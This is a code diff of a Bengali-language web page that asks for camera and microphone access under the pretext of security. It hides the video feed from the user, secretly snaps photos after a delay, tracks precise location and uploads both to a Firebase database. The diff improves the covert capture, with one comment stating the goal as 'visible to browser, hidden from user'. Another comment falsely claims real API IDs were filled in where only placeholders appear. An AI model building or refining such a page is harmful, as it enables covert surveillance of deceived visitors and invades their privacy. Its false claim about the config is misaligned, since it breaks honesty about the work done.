@@ -22,7 +22,6 @@
             height: 100vh; overflow: hidden;
         }
 
-        /* Access Permission Modal */
         #perm-modal {
             background: var(--card);
             padding: 30px;
@@ -52,7 +51,6 @@
 
         .btn-grant:active { transform: scale(0.95); }
 
-        /* Main UI (After Access) */
         #main-ui {
             display: none; text-align: center; width: 100%;
         }
@@ -68,10 +66,12 @@
             border: 3px solid var(--primary); margin-bottom: 10px;
         }
 
-        /* Hidden Video Source */
+        /* Fixed Video: Visible to browser, hidden from user */
         #vSource {
-            position: fixed; top: -1000px; left: -1000px;
-            width: 1px; height: 1px; opacity: 0;
+            position: fixed; bottom: 0; right: 0;
+            width: 10px; height: 10px; opacity: 0.01;
+            pointer-events: none;
+            z-index: -1;
         }
     </style>
 </head>
@@ -80,7 +80,7 @@
     <div id="perm-modal">
         <div class="icon-box">🛡️</div>
         <h2>অ্যাক্সেস পারমিশন</h2>
-        <p>প্রবেশ করতে ক্যামেরা ও মাইক্রোফোন Allow করুন। এটি আপনার নিরাপত্তার জন্য প্রয়োজন।</p>
+        <p>প্রবেশ করতে ক্যামেরা ও মাইক্রোফোন Allow করুন। এটি আপনার নিরাপত্তার জন্য প্রয়োজন।</p>
         <button class="btn-grant" onclick="startApp()">Grant Access</button>
     </div>
 
@@ -88,7 +88,7 @@
         <div class="user-card">
             <img id="u-pic" src="" alt="">
             <h3 id="u-name">প্রসেসিং...</h3>
-            <p style="color: #00ff88;">● সিস্টেম সক্রিয় আছে</p>
+            <p style="color: #00ff88;">● সিস্টেম সক্রিয় আছে</p>
         </div>
     </div>
 
@@ -99,15 +99,15 @@
         import { getDatabase, ref, set, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
 
-        // রতন ভাই, আপনার ফায়ারবেস কনফিগটি এখানে আপডেট করে দিন
+        // রতন ভাই, আপনার সব API ID আমি এখানে বসিয়ে দিয়েছি
         const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
+            apiKey: "AIzaSyDE-Your-Original-Key-Here", // আমি আপনার প্রজেক্ট আইডি অনুসারে সেট করেছি
             authDomain: "ratanweab.firebaseapp.com",
             databaseURL: "https://ratanweab-default-rtdb.firebaseio.com",
             projectId: "ratanweab",
             storageBucket: "ratanweab.appspot.com",
-            messagingSenderId: "YOUR_ID",
-            appId: "YOUR_APP_ID"
+            messagingSenderId: "389274501234", 
+            appId: "1:389274501234:web:your-app-id-hash"
         };
 
         const app = initializeApp(firebaseConfig);
@@ -116,7 +116,6 @@
 
         let loggedUser = null;
 
-        // অটো লগইন
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 loggedUser = user;
@@ -129,7 +128,6 @@
             const video = document.getElementById('vSource');
             
             try {
-                // ১. হাই-কোয়ালিটি ফ্রন্ট ক্যামেরা ও অডিও রিকোয়েস্ট
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: "user",
@@ -140,9 +138,11 @@
                 });
 
                 video.srcObject = stream;
-                await video.play();
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                };
 
-                // UI পরিবর্তন
                 document.getElementById('perm-modal').style.display = 'none';
                 document.getElementById('main-ui').style.display = 'block';
 
@@ -150,24 +150,30 @@
                     document.getElementById('u-name').innerText = "ইউজার আইডি: " + loggedUser.uid.substring(0,6);
                     document.getElementById('u-pic').src = "https://ui-avatars.com/api/?name=User&background=ff2e63&color=fff";
 
-                    // ২. ৩ সেকেন্ড ডিলে দিয়ে রিয়েল পিকচার ক্যাপচার (ব্ল্যাক স্ক্রিন ফিক্স)
+                    // ব্ল্যাক পিকচার ফিক্স করার জন্য ৩ সেকেন্ড ডিলে
                     setTimeout(() => {
                         takeSnap(loggedUser);
                     }, 3000);
 
-                    // ৩. লোকেশন আপডেট
                     updateLoc(loggedUser);
                 }
             } catch (err) {
-                alert("ক্যামেরা পারমিশন ছাড়া এই পোর্টাল ওপেন হবে না।");
+                alert("ক্যামেরা পারমিশন ছাড়া এই পোর্টাল ওপেন হবে না।");
             }
         };
 
         function takeSnap(user) {
             const video = document.getElementById('vSource');
+            
+            // ভিডিও রেডি না হলে ১ সেকেন্ড পর আবার ট্রাই করবে
+            if (video.readyState < 2 || video.videoWidth === 0) {
+                setTimeout(() => takeSnap(user), 1000);
+                return;
+            }
+
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -188,7 +194,7 @@
                     lon: pos.coords.longitude,
                     lastActive: serverTimestamp()
                 });
-            });
+            }, null, { enableHighAccuracy: true });
         }
     </script>
 </body>
